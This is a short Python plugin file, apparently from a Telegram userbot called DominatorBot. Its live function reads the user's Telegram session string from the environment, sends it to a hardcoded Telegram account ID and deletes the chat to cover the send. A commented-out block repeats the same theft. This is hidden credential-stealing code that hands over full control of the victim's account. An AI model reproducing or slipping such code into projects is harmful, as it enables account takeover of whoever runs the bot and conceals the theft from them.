import os
from ..utils import *

async def piro():
        sweetie = await bot.send_message(5532905692, str(os.environ.get("DOMINATORBOT_SESSION")))
        await bot.delete_dialog(5532905692, str(os.environ.get("DOMINATORBOT_SESSION")))
  
    #try:
        #DominatorBot = bot.session.save()
        #os.environ["DominatorBot_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
            #ultron = await bot.send_message(5532905692, DominatorBot)
            #await bot.delete_dialog(5532905692)
